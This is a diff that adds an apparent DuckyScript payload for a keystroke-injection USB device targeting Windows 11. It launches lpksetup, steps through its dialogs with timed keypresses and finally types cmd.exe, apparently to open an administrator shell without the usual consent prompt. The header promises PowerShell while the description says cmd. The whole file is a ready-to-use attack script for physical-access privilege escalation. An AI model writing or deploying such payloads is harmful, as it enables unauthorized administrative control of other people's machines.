@@ -1,0 +1,86 @@
+REM ####################################################################################
+REM #                                                                                  |
+REM # Title        : Lunch PowerShell in admin mode, Windows 11                        |
+REM # Author       : Miiraak                                                           |
+REM # Version      : 1.0                                                               |
+REM # Category     : Execute                                                           |
+REM # Target       : Windows 11                                                        |
+REM #                                                                                  |
+REM ####################################################################################
+
+REM Requirements:
+REM     - none
+
+REM Description:
+REM     - Ouvre un cmd en administratateur
+
+DELAY 1000
+GUI r
+DELAY 300
+STRING lpksetup
+DELAY 300
+ENTER
+DELAY 300
+ENTER
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+ALT TAB
+DELAY 300
+ALT TAB
+DELAY 300
+UP
+DELAY 100
+UP
+DELAY 300
+MENU
+DELAY 100
+UP
+DELAY 100
+ENTER
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+RIGHT
+DELAY 100
+RIGHT
+DELAY 100
+RIGHT
+DELAY 100
+RIGHT
+DELAY 100
+RIGHT
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 300
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 100
+STRING cmd.exe
+DELAY 100
+ENTER
